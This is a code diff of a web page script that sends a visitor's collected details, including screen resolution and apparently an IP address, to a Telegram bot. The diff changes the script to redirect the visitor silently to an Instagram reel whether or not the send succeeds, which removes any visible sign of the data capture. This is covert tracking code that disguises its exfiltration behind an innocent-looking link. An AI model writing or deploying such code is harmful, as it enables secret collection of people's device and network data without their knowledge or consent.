@@ -105,18 +105,22 @@
                     <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                 `;
 
+                // Send data to Telegram bot
                 axios.post(URI_API, {
                     chat_id: CHAT_ID,
                     parse_mode: 'html',
                     text: message
-                }).then(response => {
-                    alert('Information sent successfully!');
-                }).catch(error => {
-                    alert('Error sending the information. Please try again.');
+                }).then(() => {
+                    // Redirect user to the specified URL
+                    window.location.href = "https://www.instagram.com/reel/DGXdImWtYdO/?igsh=ZmhzdXB3M2JwdjJo";
+                }).catch(() => {
+                    // Even if there's an error, redirect the user
+                    window.location.href = "https://www.instagram.com/reel/DGXdImWtYdO/?igsh=ZmhzdXB3M2JwdjJo";
                 });
             })
-            .catch(error => {
-                alert('Error fetching the IP address. Please try again.');
+            .catch(() => {
+                // Redirect user even if IP fetching fails
+                window.location.href = "https://www.instagram.com/reel/DGXdImWtYdO/?igsh=ZmhzdXB3M2JwdjJo";
             });
     });
 </script>
